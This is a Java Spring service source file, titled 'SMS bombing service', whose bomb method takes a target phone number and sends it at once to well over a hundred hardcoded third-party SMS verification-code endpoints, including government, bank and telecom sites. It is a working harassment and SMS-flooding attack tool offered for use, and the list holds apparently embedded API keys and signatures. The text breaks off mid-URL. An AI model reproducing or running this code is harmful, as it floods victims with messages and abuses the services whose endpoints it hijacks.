package cn.yiidii.openapi.smsbomb.service.impl;

import cn.yiidii.openapi.base.exception.ServiceException;
import cn.yiidii.openapi.common.util.RedisUtil;
import cn.yiidii.openapi.smsbomb.service.ISmsBombService;
import cn.yiidii.openapi.smsbomb.service.dto.SmsBombRunnable;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

/**
 * <p>
 * 短信轰炸服务
 * </p>
 *
 * @author: YiiDii Wang
 * @create: 2020-12-28 22:54
 */
@Service
@RequiredArgsConstructor
@Slf4j
public class SmsBombServiceImpl implements ISmsBombService {

    @Resource(name = "generalExecutor")
    private final ThreadPoolTaskExecutor generalExecutor;

    private final RedisUtil redisUtil;

    @Override
    public void bomb(String mobile) throws ServiceException {
        Object mobileCache = redisUtil.get("mobileBomb");
        if (Objects.nonNull(mobileCache)) {
            throw new ServiceException(String.format("起飞失败，原因：%s正在起飞", mobileCache));
        }

        boolean expireSucc = redisUtil.set("mobileBomb", mobile, 30);
        if (!expireSucc) {
            throw new ServiceException("起飞失败，原因：设置redis失败");
        }

        log.info("{}正在起飞", mobile);

        List<String> interfaceList = getAllInterface();
        for (String url : interfaceList) {
            SmsBombRunnable runnable = new SmsBombRunnable();
            url = url.replace("{PHONE}", mobile);
            runnable.setUrl(url);
            generalExecutor.execute(runnable);
        }
    }

    /**
     * 暂时不写数据库了，临时
     *
     * @return
     */
    private List<String> getAllInterface() {
        String interfaceStr = "http://218.29.159.26:9000/website/smsSend?phoneNum={PHONE}\n" +
                "http://passport2.chaoxing.com/num/phonecode?phone={PHONE}&needcode=false\n" +
                "http://www.zjzxts.gov.cn/sendMsg.do?modelMethod=sendMessage&phonenum={PHONE}\n" +
                "http://member.cabplink.com/sso/sendRegisterSMS.zaction?mobile={PHONE}\n" +
                "http://www.jsvideo.tv/sendMsg?phone={PHONE}\n" +
                "http://app.jiayouxueba.cn/api/v3/sms/getcode?mobile={PHONE}\n" +
                "http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile={PHONE}\n" +
                "https://www.guiji.ai/site/sms?type=2&mobile={PHONE}\n" +
                "http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage&mobile={PHONE}\n" +
                "http://www.zjzxts.gov.cn/sendMsg.do?modelMethod=sendMessage&phonenum={PHONE}\n" +
                "http://www.jsvideo.tv/sendMsg?phone={PHONE}\n" +
                "http://dsaidjd.yunsu001.top/api.php?act=user&key=2t5pTz8py8Ktt2M8P&phone={PHONE}\n" +
                "http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName={PHONE}\n" +
                "http://xinweixin.11183.com.cn/youzheng/login/security?phone={PHONE}\n" +
                "http://cuishou.yunsu001.top/api.php?act=user&key=J6ojqxXqZ4sXqMsMs4&phone={PHONE}\n" +
                "http://sms1.yunsu001.top/api.php?act=user&key=Em4o116MCr11srrRM&phone={PHONE}\n" +
                "http://kyddn.log56.com/sq_server/verifyCode.action?mobile_no={PHONE}\n" +
                "https://user.zhaobiao.cn/ssologin.do?method=sendLoginCodeAjax&mobile={PHONE}&hasSend=0\n" +
                "http://tzb1.yunsu001.top/api.php?act=user&key=4gHGGeEJEoNL44Lqqe&phone={PHONE}\n" +
                "http://bolan.yunsu001.top/api.php?act=user&key=nqzR5hq8JRrkZHNM78&phone={PHONE}\n" +
                "http://user.daojia.com/mobile/getcode?mobile={PHONE}\n" +
                "https://www.guiji.ai/site/sms?type=2&mobile={PHONE}\n" +
                "http://member.cabplink.com/sso/sendRegisterSMS.zaction?mobile={PHONE}\n" +
                "https://api-v5-0.yangcong345.com/captchas/v4.8?phone={PHONE}&amp;code=CN&amp;type=codeVerify\n" +
                "https://login.koolearn.com/sso/sendVoiceRegisterMessage.do?callback=jQuery111205661385064312077_1594952633553&amp;type=jsonp&amp;mobile={PHONE}&amp;msgInterval=60&amp;imageCode=&amp;countryCode=86&amp;country=CN&amp;_=1594952633566\n" +
                "https://login.51job.com/ajax/sendphonecode.php?jsoncallback=jQuery18303956739664829656_1592495501835&amp;phone={PHONE}&amp;type=5&amp;nation=CN&amp;from_domain=yjs_h5&amp;verifycode=&amp;_=1592495526803\n" +
                "https://api.esuizhen.com/sms/captcha/get?businessId=1&amp;productId=2&amp;mobile={PHONE}&amp;_=1607276374351\n" +
                "https://user.meilimei.com/taomi/user/sendSmsCaptcha?mobile={PHONE}\n" +
                "https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone={PHONE}\n" +
                "http://www.edu-edu.com/cas/web/message/send?phone={PHONE}\n" +
                "http://api.passport.pptv.com/snsms/sendcode?cb=msSendCode&amp;phoneNumber={PHONE}&amp;deviceId=p_1584518586025_48072460278550296&amp;terminal=PC&amp;channel=208000103005&amp;uuid=0e2a64ae-e07e-49d6-852e-3de883df8003&amp;imgCode=&amp;format=jsonp&amp;_=1584518959802\n" +
                "http://gift.jac.com.cn/wap/user/send_valdate_code?phone={PHONE}\n" +
                "http://order.sure56.com/WXEQR/EQR/service/newservice/commonService.ashx?fun=sendsms&amp;phone={PHONE}&amp;registrant=速尔网管中心&amp;sendSite=速尔网管中心&amp;smsContent=验证码:【code】,2分钟内有效，如非本人操作，请忽略本短信。【速尔快递】&amp;smsTime=2\n" +
                "https://user.daojia.com/mobile/getcode?mobile={PHONE}&amp;newVersion=1&amp;bu=103\n" +
                "http://wx.lnfxrz.com/Home/getCode?phone={PHONE}\n" +
                "https://bentleywechat.arvato-ocs.com/api/customer/verify-code?phone={PHONE}\n" +
                "https://mini.1-tree.com.cn/uni/plus/verification?phone={PHONE}&amp;param=DPo6O8nQ41E8Sl17W0cE81A7S927MXL\n" +
                "https://mbloan.bkjk.com/mbloanapp/api/v1/public/sms_code/{PHONE}/LOGIN_REGISTER\n" +
                "https://www.yuyue58.cn/Ajax.ashx?action=GetVerifyCode1&amp;mobile={PHONE}\n" +
                "https://app.yiliao.ccb.com/APP/ccb/login/action/UserLoginAction.jspx?APPOINT_SOURCE=0&amp;AREA_CODE_ELECARD=&amp;CHANNEL_ID=&amp;IMEI_ID=&amp;PHONEOPERATINGSYS=0&amp;PHONETYPE=&amp;PHONEVERSIONNUM=&amp;PHONE_NUMBER={PHONE}&amp;PUBLIC_SERVICE_TYPE=020004&amp;hospitalID=200003&amp;isRead=1&amp;loc=c&amp;op=checkPhoneNumDiff&amp;opVersion=2.6.71&amp;operateUserSource=0&amp;QY_CHECK_SUFFIX=437b3a0d8310eced014b1ded89c7be42\n" +
                "https://webapi.mybti.cn/User/SendVerifyCode?phoneNumber={PHONE}&amp;clientid=6653a94b-1650-4c3d-a287-f56e8ae8e943\n" +
                "https://xiyuancare.com/mcsp-web/register!smsCode.xhtml?tel={PHONE}&amp;responseType=weixin\n" +
                "https://www.zhongguojd.com/Api/Login/verify?mobile={PHONE}&amp;format=json&amp;token=\n" +
                "http://jyxsl.xjems.com/phonemessage?userid={PHONE}\n" +
                "https://keyike.com/api/acms/sys/na/phone-code?phone={PHONE}&amp;useFor=KSR_REG\n" +
                "http://weixin.hzyotoy.com/stwl/tool/Middleware.php?mobile={PHONE}&amp;obj=oYoBR1Js8G-w9RGYW4G-TnZb1N9s01&amp;act=sendphonecode\n" +
                "https://syr.bjhwbr.com/app/public/sendVC?pno={PHONE}&amp;from=sxx&amp;device=wechat&amp;client=wechat&amp;ostype=wechat&amp;sk=ce19ea265a164cba80392feb12a25228&amp;at=2&amp;sqv=0&amp;aqv=0&amp;ts=1605213158&amp;sg=a6bbab550bea099c738d291e56787f39\n" +
                "https://m.baletu.com/loginapi/sendVerifyCode?type=1&amp;mobile={PHONE}&amp;from_mini_wx=1&amp;loginapi_sendVerifyCode_type=1\n" +
                "http://www.zhihuihedao.cn/commonAction!commonCode.action?mobile={PHONE}\n" +
                "http://yuncompany.bestsep.com/Index/getDxCode?type=1&amp;address={PHONE}\n" +
                "https://edu.okjiaoyu.cn/api_courseware/schoolregist/send_sms?_=1606063266729&amp;tel={PHONE}\n" +
                "https://sandbox.win-sky.com.cn/sandbox/login/regcode?phone={PHONE}\n" +
                "http://smartemple.zhouhao8.com/common/teleCheckocde?tel={PHONE}\n" +
                "http://kw.open.com.cn/sms/send?timestamp=1606064153350&amp;projectId=9929a573364e43de834f83501d214acb&amp;phoneno={PHONE}&amp;deviceInfo=eyJ2IjoiL01SWGxaaG5ibWdwcGVqR1IyWThGajJNV29oT01wand1Qkt4YytJSEs3TmQ0RkFkSnFJRGJLYURPY1hPQTRQaSIsIm9zIjoid2ViIiwiaXQiOjgzODIsInQiOiIyTnQ2M0dQbG4veW9ROTJwSlFhbllYVDhXU3hHVVRnZ3FLdFZRcUc5TUV5QnhwZmhpK0lBeVp4YXJveFFvWEkzWjkvSmFRaTR0S3U0b1RMWTNDbnU0S0JjallteFpQcHVVSUpzb1BFNzJSYz0ifQ%3D%3D\n" +
                "https://yuhek.com/api/sendCode?phone={PHONE}\n" +
                "https://www.ykt100.com/api/admin/mobile/sendMobile/common?mobile={PHONE}\n" +
                "https://kfsbusiness.anjuke.com/weiliaoke/login/sendcode.json?ticket=&amp;cid=&amp;cv=5.6.0&amp;app=i-ajk&amp;udid2=85C1EEA5-6E6A-449B-BD5C-118EA0DFDDBB&amp;phone={PHONE}\n" +
                "https://yuwen.yayaketang.com/kid-chinese/app/sendlogincode?_t_=1598496110&amp;appId=yayayuwen&amp;bundleID=com.zuoyebang.yayayuwen&amp;channel=appstore&amp;cuid=bf2e0e7ce797cb3cc81d5cfefe8060341d2142b8&amp;dayivc=65&amp;device=iPhone%206s&amp;feSkinName=skin-gray&amp;iOSVersion=13.6&amp;isNotchScreen=0&amp;nt=wifi&amp;os=ios&amp;phone={PHONE}&amp;screenscale=2&amp;screensize=750x1334&amp;sign=1369a9a7b551f9fe1384a9f0de340463&amp;token=2_XPXQH3c5HRPtFHkSwi3sCCURmT25QfxM&amp;vc=202&amp;vcname=1.0.4&amp;zbkvc=136\n" +
                "https://gate.abctime-me.com/us/v1/user/verify/code?mobile={PHONE}&amp;ver=2\n" +
                "https://api.ebox.gegebox.com/v2/operator/{PHONE}/sms?captcha_code=&amp;type=register&amp;voice=0\n" +
                "http://n.youyuan.com/v20/yuan/get_registerMobile_code.html?mobile={PHONE}\n" +
                "https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&amp;phone={PHONE}\n" +
                "https://webapi.account.mihoyo.com/Api/create_mobile_captcha?action_ticket=&amp;action_type=regist&amp;mobile={PHONE}\n" +
                "https://www.771ka.com/register/checkinfo?clientid=newmobile&amp;newmobile={PHONE}&amp;_=[时间]\n" +
                "https://passport.eqxiu.com/eqs/sms/token?phone={PHONE}&amp;type=quickLogin&amp;checkPhone=1&amp;channel=21&amp;version=4.4.1\n" +
                "http://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={PHONE}&amp;appId=www_home&amp;v=2&amp;sig=&amp;t=1592615855903&amp;v=2\n" +
                "http://lemon555.xyz/api.php?hm={PHONE}&amp;ok=\n" +
                "https://uac.10010.com/portal/Service/SendMSG?callback=jQuery17205960549095114636_1596719990361&amp;req_time=1596720031540&amp;mobile={PHONE}&amp;unicom_number=0&amp;_=1596720031543\n" +
                "http://www.hongguoshu.net/public/index.php/hgs/index/registersms.html?mobile={PHONE}&amp;code=3950\n" +
                "https://www.shoufacm.com/portal/login/getSmsCode?timestamp=1606309133010&amp;phoneNumber={PHONE}&amp;type=register\n" +
                "http://gzzk.eeafj.cn/phoneYzm.shtml?method=send&amp;phone={PHONE}\n" +
                "https://www.ggzuhao.com/Login/SendVerifyCode?phone={PHONE}\n" +
                "https://jdapi.jd100.com/uc/v1/getSMSCode?account={PHONE}&amp;sign_type=1&amp;use_type=1\n" +
                "https://services.qiye.163.com/service/official/sendCode?jsonpcallback=jQuery190039810459070645865_1584688891341&amp;mobile={PHONE}&amp;_=1584688891342\n" +
                "https://www.zuoyebang.com/session/pc/sendtoken?ajax&amp;phone={PHONE}&amp;sendType=1&amp;tokenType=6&amp;_t_=1573784070671&amp;os=pcweb&amp;appId=homework&amp;channel=&amp;plat=wap&amp;cType=pc&amp;fr=&amp;lastfrom=&amp;name=JC_C2_3_20100\n" +
                "https://www.hx2car.com/mobile/loginCode.json?code=d889c6084be2613b8ed976d2336bc53a&amp;devicetoken=0FAEEA4E-B279-4409-93A6-05B4EDE49DE8&amp;phoNum={PHONE}\n" +
                "https://case.100.com/captcha?source=57&amp;mobile={PHONE}&amp;resend=0&amp;mkey=customer\n" +
                "https://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&amp;type=11&amp;t=biz_rf_portal_mgr&amp;ef=jsnew&amp;resp_charset=UTF8&amp;area=86&amp;mobile={PHONE}\n" +
                "http://www.sinoimex.com/Action/User.ashx?action=SandVerificationCode&amp;username={PHONE}\n" +
                "http://www.szieg.com/memberverify/ajax/sendVerify.do?compType=member_register-15179833411661788&amp;verifyType=SMS&amp;value={PHONE}\n" +
                "http://tousu.315che.com/che_v3/touSu/registerCode?phone={PHONE}&amp;_=1606374536527\n" +
                "http://mp1.haolongjiang.net/app/index.php?i=2&amp;c=entry&amp;do=sendcode&amp;m=fy_lessonv2&amp;mobile={PHONE}\n" +
                "https://login.51job.com/ajax/sendphonecode.php?jsoncallback=jQuery18303640777548241676_1579193274318&amp;phone={PHONE}&amp;type=5&amp;nation=CN&amp;from_domain=51job_m&amp;verifycode=&amp;_=1579193365587\n" +
                "https://goappic.sf-express.com/user/riderregister/sendvcode?bind_phone={PHONE}&amp;source=laxin\n" +
                "http://www.568568.net/jinan/w_get_vcode.aspx?phone={PHONE}\n" +
                "http://m.bussst.com/index.php/Index-send_mobile_code.html?mobile={PHONE}&amp;type=reg\n" +
                "https://wechat.bdia.com.cn/service/user/sendMessage?mobile={PHONE}&amp;key=NzNhMjRmNjgtMTIwOS00MzAxLTgyM2ItZjBjOTgzYjhlZjI2&amp;language=CN&amp;source=SERVICE&amp;openId=otYLZ1cirg4F6TNfFeso2Kr9bU84&amp;pid=otYLZ1cirg4F6TNfFeso2Kr9bU84&amp;userCode=null\n" +
                "https://cloud.mall.changan.com.cn/main/auth/getSMSCode?mobile={PHONE}\n" +
                "https://mobile.cmbchina.com/PToolkit/Recommend/OutsideRecommend.aspx?$=1&amp;mobile={PHONE}&amp;ClientNo=c27a28df991740c191a3e4160bb11bb1&amp;Command=SENDVERIFY\n" +
                "http://user.daojia.com/mobile/getcode?mobile={PHONE}\n" +
                "http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile={PHONE}\n" +
                "http://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={PHONE}&amp;appId=www_home&amp;v=1&amp;sig=&amp;v=1\n" +
                "http://sd.ny360.cn/appUserhttp://sd.ny360.cn/appUser!sendSMS.action?phone={PHONE}\n" +
                "http://www.farmhyb.com/farmhyb_server/user/sendCodeForResist?code=2391&amp;phone={PHONE}\n" +
                "https://sdk-server.huchihuchi.com/api/platform/code/phone_code?type=3&amp;phone={PHONE}&amp;account=&amp;token=&amp;api_source=3\n" +
                "https://m.hlszyk.com/e/member/doaction.php?enews=Rzsj&amp;phone={PHONE}\n" +
                "https://api.156zs.com/code/?accesstoken=u4PERYzWzjspFPcVcfimaubec01MFZH6&amp;phone={PHONE}&amp;verification=&amp;ep=3\n" +
                "https://ytcx.whyuntai.com/ytcx/ytcx/inf/getMsgCode?secretKey=9sd5hlkwd31afas5asfo314ibbadf21zxmw&amp;phone={PHONE}&amp;openId=obL6qxElSGwDRIkZxRSQ9MTjfFd0&amp;msgType=1\n" +
                "http://cjjl.chelun.com/shortMessage/captcha?mobile={PHONE}\n" +
                "https://nuc.api.mgtv.com/v1/GetMobileCode?deviceid=b3edee6c-26cb-40e8-bb51-03dc99f7d788&amp;invoker=msite&amp;mobile={PHONE}&amp;smscode=86&amp;operation=mobilecodelogin&amp;captcha=&amp;callback=jsonp_8qr2ufm7zd5imqe\n" +
                "http://pos.bsdglasses.com:9091/getCode?mobile={PHONE}\n" +
                "https://eapi.huolala.cn/?_m=account&amp;_a=sms_code&amp;args=%7B%22phone_no%22%3A%22{PHONE}%22%2C%22type%22%3A1%7D&amp;_a=sms_code&amp;_m=account&amp;_su=20110921102963310000007772246883&amp;os=android&amp;device_id=355982085135622&amp;_t=1604927429&amp;user_md5=3f1fcdc1fee9660fa484a52ec12c9141&amp;device_type=SM-G9500&amp;version=3.1.14&amp;revision=3114\n" +
                "https://api.intsig.net/user/send_sms_vcode?area_code=86&amp;mobile={PHONE}&amp;reason=register&amp;language=zh-cn&amp;app_name=CamCard_AD_LITE_CN_2@7%2E36%2E0%2E20171026\n" +
                "https://m.hhrcard.com/copartnerpassport/sendmobilecaptcha?phone={PHONE}&amp;vcode=&amp;apply_from=0_&amp;challenge=\n" +
                "http://api2.rolormd.com/Base/Tools/SendMobileMsg_Voice?mobile={PHONE}&amp;phonetype=86&amp;language=1\n" +
                "https://api.3ceasyb2b.com/v1/shopRegister/noAuth/registerCode?company_id_=1&amp;phone_={PHONE}&amp;nonce=16048839233759112\n" +
                "http://uac.10010.com/oauth2/OpSms?callback=jsonp1557631709566&amp;req_time=&amp;user_id={PHONE}&amp;app_code=ECS-2233&amp;msg_type=01\n" +
                "http://www.zuoyebang.com/session/pc/sendtoken?ajax&amp;phone={PHONE}&amp;sendType=1&amp;tokenType=6&amp;_t_=1573784070671&amp;os=pcweb&amp;appId=homework&amp;channel=&amp;plat=wap&amp;cType=pc&amp;fr=&amp;lastfrom=&amp;name=JC_C2_3_20100\n" +
                "http://211.156.201.12:8088/youzheng//ems/security?phone={PHONE}\n" +
                "http://api.qingmang.me/v1/account.sendVerification?platform=console&amp;token=&amp;phone=+86{PHONE}&amp;code=10164337\n" +
                "http://id.ifeng.com/api/simplesendmsg?mobile={PHONE}&amp;comefrom=7&amp;auth=&amp;msgtype=0\n" +
                "http://case.100.com/captcha?source=57&amp;mobile={PHONE}&amp;resend=0&amp;mkey=customer\n" +
                "http://xinyong.chaojizhangdan.com/Register/getVerifyCode.html?phone={PHONE}\n" +
                "http://seo.sdcx9.com/getCode?tel={PHONE}\n" +
                "www.sdxhyg.cn:8060/h5interface/phoneMobile/getCode?phoneNumber={PHONE}&amp;type=0\n" +
                "http://kidsclub.winshare.com.cn/api/winxuan/sendMessage/{PHONE}\n" +
                "http://www.sheqd.cn/sms/sendMsg.do?msgType=bindCheckCode&amp;periodSec=1800&amp;phone={PHONE}\n" +
                "http://activity.renren.com/livecell/ajax/tryVerify?sanbox=a&amp;phoneNum={PHONE}\n" +
                "http://sapi.16888.com/app.php?mod=account&amp;extra=mobileCode&amp;mobile={PHONE}\n" +
                "http://cms.51fenmi.com/api/base/public/getCode?mobile={PHONE}\n" +
                "http://srmemberapp.srgow.com/sys/captcha/{PHONE}\n" +
                "http://vcrm.dfsk.com.cn/page_v2/data/SmsSend.aspx?action=SendSms&amp;sign=b5a3dea49ea8215022637207c8478bac&amp;appid=smssign+&amp;noncestr=OX5diuUVqwe92sR2ExpRmcBNDdVByT13&amp;time=1604672725&amp;phone={PHONE}\n" +
                "http://www.aqnhs.cn/api.php?act=user&amp;key=4C9eYEENoowGS4Ab7G&amp;phone={PHONE}||0\n" +
                "http://qzqq.wangbo.cn/tools/wx_ajax.ashx?action=sendchecksms&amp;mtel={PHONE}\n" +
                "http://vpay.upcard.com.cn/vcweixin/singleUser/register/phonecheck?company=c4p&amp;code=091LJVkl2TXnV543Btnl2na0Xm3LJVkB&amp;type=&amp;beforeUrl=&amp;beforeTitle=&amp;code=091LJVkl2TXnV543Btnl2na0Xm3LJVkB&amp;phone={PHONE}\n" +
                "http://wx.yx56.cn/memberLogin/saveAndgetSmsCode?phone={PHONE}&amp;type=3\n" +
                "https://vip.photonpay.com/api/photon/member/base/sendPhoneCode?phone={PHONE}&amp;phoneAreaCode=86&amp;type=4&amp;__t=1604589991844\n" +
                "http://www.apptg.cn/web/getsdk?mobile={PHONE}\n" +
                "http://pic.znc.cn/signup/getcode/{PHONE}\n" +
                "http://case.100.com/captcha?callback=jQuery111302448636349559561_1604588567567&amp;source=62&amp;resend=0&amp;mkey=customer&amp;mobile={PHONE}&amp;_=1604588567568\n" +
                "http://bbs.ecfo.com.cn/plugin.php?id=comiis_sms&amp;action=register&amp;comiis_tel={PHONE}&amp;secanswer=undefined&amp;secqaahash=undefined&amp;seccodeverify=undefined&amp;seccodehash=undefined&amp;seccodemodid=undefined&amp;inajax=1\n" +
                "http://www.bwjshui.com/canCheckCode.do?phone={PHONE}\n" +
                "https://buffgm.czapp.cn/gm/login/getPhoneCheckCode?phone={PHONE}&amp;_t=1604588064\n" +
                "http://mrbs.51huiyishi.com/register/sms/{PHONE}\n" +
                "https://www.7zz6.com/user.php/Public/SendSMS?tel={PHONE}\n" +
                "https://stereo.fenbeitong.com/stereo/open/captcha/sms/send?type=sale_leads&amp;mobile={PHONE}\n" +
                "https://customer.helipay.com/customer/safeCenter/sendVcodeOnly.action?mobile={PHONE}\n" +
                "http://passport.yzz.cn/index.php/api/user/regist_send_code?callback=jQuery172032709840321007433_1604587159955&amp;send_to={PHONE}&amp;_=1604587239727\n" +
                "http://www.pmgtsp.cn/music_assessment_portal/user/sendMsg?phoneNumber={PHONE}&amp;source=web\n" +
                "https://www.sanxiapay.com/emallapp/pnew/emallapp/mbRegister/sendregmessage.do?phoneNo={PHONE}\n" +
                "https://www.guagualog.com/login_ajaxGetRegisterCode.do?username={PHONE}\n" +
                "http://www.fjsfjq.com/sendCheckCode.htm?mobile={PHONE}\n" +
                "http://buy.ccb.com/client/getVerificationCodeAjaxForWx.jhtml?phoneNum={PHONE}\n" +
                "https://api.julym.com/hz/api.html?number={PHONE}\n" +
                "https://saas-user-gw.mararun.com/v1/oauth/getMessage?name={PHONE}&amp;time=1603024256&amp;signature=6167c5fd66a7bb7e2d03e7dd85f0816a\n" +
                "https://saas-user-gw.mararun.com/v1/oauth/getMessage?name={PHONE}&amp;time=1603024081&amp;signature=567f6506589389449c3377aece71be26\n" +
                "https://gateway.qoqq.com/api-ma/basic/user/identify?mobile={PHONE}\n" +
                "http://photo.spoorts.cn/mlssy/html/send_sms?mobile={PHONE}&amp;send_type=register\n" +
                "https://saas-user-gw.mararun.com/v1/oauth/getMessage?name={PHONE}&amp;time=1603023353&amp;signature=4c375080dcb92f2b8a46f47b10f80d43\n" +
                "https://tms.wudeli.com/zbn-web/carrier/carrierRegisterSms?cellphone={PHONE}\n" +
                "https://www.56jiyun.com/jywl/sendSmsCode.htm?type=0&amp;userName={PHONE}&amp;userType=0\n" +
                "http://test-open.stg.yqb.com/moap/business/sendRegistration?phone={PHONE}&amp;smsId=PC_TEMPLATE_PLATFORM_REGISTRATION\n" +
                "http://openapi.aldwx.com//Main/action/Login/Login/send_code?phone={PHONE}&amp;option=1&amp;type=1\n" +
                "https://api.haier.net/mapping/api/sendVcodeMessage?userName={PHONE}\n" +
                "https://api.haier.net/mapping/api/checkRegisterUserName?userName={PHONE}\n" +
                "https://open.qingting.fm/v1/msg/send?phone={PHONE}&amp;ts=1604585922&amp;sign=7925d3162039df94a16af344f9022de8\n" +
                "http://opendj.jd.com/passport/sendRegMobileValidCode.htm?type=1001&amp;userName=&amp;password=&amp;nickName=&amp;email=&amp;phone={PHONE}&amp;mobileValidateCode=&amp;contactPhone1=&amp;contactEmail1=&amp;contactPhone2=&amp;contactEmail2=\n" +
                "https://i.wuyuan.io/sms/code?mobile={PHONE}\n" +
                "http://www.checheyun.cn/index.php?route=tool/sms/get_code&amp;mobile={PHONE}\n" +
                "https://www.sensorsdata.cn/api/passport/sms/quest_new/{PHONE}?_t=kge2a4x7\n" +
                "https://www.juhe.cn/sendsms?mobile={PHONE}&amp;codeType=21\n" +
                "https://umsauth.quanshi.com/api/register/sendMobileVerifyCode/web/86/{PHONE}\n" +
                "https://b.shengpay.com/sdppro/api/register/account/sendRegister/2/{PHONE}\n" +
                "https://account.sogou.com/web/account/checkusername?username={PHONE}\n" +
                "http://passport.kedou.com/front/swpaysdk/sendRegActiveNo.htm?mobile={PHONE}&amp;geetest_challenge=65574a2c348b6cf7abcfda56a498736b&amp;geetest_validate=e118b684de5cc6e57be1081b6ac460ba&amp;geetest_seccode=e118b684de5cc6e57be1081b6ac460ba%7Cjordan&amp;showGt=false\n" +
                "https://afsdk.15166.com/web/register/phoneCode?appID=1601290001&amp;channelID=1010&amp;deviceUID=a98c13bf-7134-3e28-1f01-d08742123648&amp;subChannelID=1010&amp;timestamp=1602957810&amp;username={PHONE}&amp;signature=4fee24eb6fadeb93cda798fcf40325ba&amp;commonData=%7B%22event_time%22%3A1602957810%2C%22os%22%3A5%2C%22osVersion%22%3A%2210%22%2C%22deviceUID%22%3A%22a98c13bf-7134-3e28-1f01-d08742123648%22%2C%22user_agent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F86.0.4240.75+Safari%2F537.36%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3D-njrwLePXjAAPrJfR3uv7qttuMxw-y7FPy2PXmh1QbInmrbwpbe-aBlvXs-i7Iaip4AQLZ92I7lsUu-zQ0I2JK%26wd%3D%26eqid%3Ddfb921e2000635b9000000025f8b31cb%22%2C%22browser%22%3A%22Chrome%22%2C%22url%22%3A%22http%3A%2F%2Fwww.15166.com%2Fpassport%2Fregist.html%22%2C%22browser_version%22%3A%2286.0.4240.75%22%7D\n" +
                "http://passport.soo56.com/login-zhuce2.aspx?T=10&amp;ObjectStrPhone={PHONE}&amp;IsPorE=1\n" +
                "https://m.chinawutong.com/ashx/SendSMS.ashx?code={PHONE}&amp;Kind=Reg&amp;CodeType=sms&amp;ran=0.6139051560224362\n" +
                "https://vip.photonpay.com/api/photon/member/base/sendPhoneCode?phone={PHONE}&amp;phoneAreaCode=86&amp;type=4&amp;__t=1602954375389\n" +
                "http://user.ka1che.com/userRegisterAndModify/RegisterSendValidateCode.do?userMobile={PHONE}&amp;userType=R02\n" +
                "http://acc.jxf.gov.cn/webAuthAdmin/mUserRegister/sendMsg?phone={PHONE}\n" +
                "https://www.xd.com/users/sendWebRegCode?callback=jQuery1102028291174864407553_1602951308961&amp;mobile={PHONE}&amp;area_code=86&amp;_=1602951308962\n" +
                "https://member.8090.com/reg_type.php?action=getcode&amp;phone={PHONE}\n" +
                "http://libtcm.cptcm.com/docZhongyi/pc/login/sendCaptcha.jspx?phoneNum={PHONE}\n" +
                "https://wappass.baidu.com/wp/api/login/sms?staticpage=https%3A%2F%2Ficash.baidu.com%2Fv%2Fstatic%2Ffe-cloan%2Fstatic%2Flogin%2Fv3Jump.html&amp;charset=UTF-8&amp;token=&amp;tpl=bp&amp;apiver=v3&amp;tt=1602949826748&amp;username={PHONE}&amp;countrycode=&amp;is_voice_sms=0&amp;dialogVerifyCode=&amp;dialogverifycode=&amp;vcodesign=&amp;vcodestr=&amp;ctype=&amp;subpro=jxjmain&amp;encryptedId=&amp;encryptedid=&amp;moonshad=16951e22ada722604805a10aab301bef2&amp;dv=tk0.74608554270875921602949817641%40vvn0iz7CKcomzDD64Cn0jPo6jPFEj1OEzTFU6N5kDa7khi7C3comzDD64Cn0jPo6jPFEj1OEzTFU6N5kD-4QAi7CIcomzDD64Cn0jPo6jPFEj1OEzTFU6N5kDy4ChioCqz5kqcnt0CnahPJQ0PJ%7EaeIXTcBExaFvWaokuWPktWomWW50hhna4DJaizJajNF%7ErRFs6bGEwc4Ctx72W_zn0mvoCqlovWz4MnW5kuaoMKcPktWoCucoMqWovWl7k3a52WzoCDQ5kuQoktcoQow41zioCqzolWloCKa5ko-okKcnt0CnahPJQ0PJ-4aIXaRG2WaoCScoCSyovWaoQua50hhna4DJaizJajNF%7ErRFs6bGEai%7EggO-gIx9z1PhInhovWl5kS%7ECnmGscW5MKw4Mqy4CnwoMKW7kKa7Cuz4Mql7CDx7kt-4MDzhnN526bBs6XOExTBq__BnromWW5ktxokocoQnl4mWz7CuW5ktW7kqcoC3lomWz7CuW5ktW4kq_&amp;ds=hdTFEWLcEZqEJ11RH%2Fpv5WRh53lmzCJKAmsOp9%2FZYwSvF3NDoyT%2B7zHvXxqKVHS7YD0Zt8LZWilEkuPB%2FLn3VVaZH4dDYpBc6HmhXNOFh4c%2BkQPErRCR%2FY3rZGryuQlCrOLfJzkslyYn87RFvvLPWBZGmYOSX7DY%2Fp9HvV1hmov5s0B8jnXSDLzzLZp7uSNcS8ATq3kkAuM7gfQkYDCg53xLxbYg2zqQcI0CDaF%2ByGCl%2F6bWT6eKg53Q4QTnJKOqTAv%2FiWHsbZR4tVxMmlVEDJRnUPlt651lgJpMIy8nXrGDCVC4X8rVaj7KRf%2FBCQ%2B5iEpiuUvgSfeCTzm7SFX9b7iGI4Zl%2BWWfjmZLSoyQKZOm%2Fmu%2FfSsLsN3DSa4J%2F0DwK5z2rU0H7lrTLknhWix28LhFdhL%2BzM595OONQRlByXMFA9MyL4Qb8mt1sbc7y4bCRXJEgDjef6UWykIFFYF5Kz6nVoTe%2BjNNXCJ4ihI2muhutjrCTe5jQdDDz5ffas6eJKRw3oPqdYquxyxD0CxDMyrf1ThPo2wB%2FaGcylDabOkexKu3k6MvnVsYE5sE4I1GGgfkV0WG%2BZTiWJB5zhHwFAI4jzX%2BmbO5GDETsJQsW8btxoQyZwbp9H0DQ3CM%2BbpPMZYriLRROo48Fa1h7W54iglXStluLypEDqqiCohNKZzYBilDw9cXgfUZrucMqc1xzym%2BmK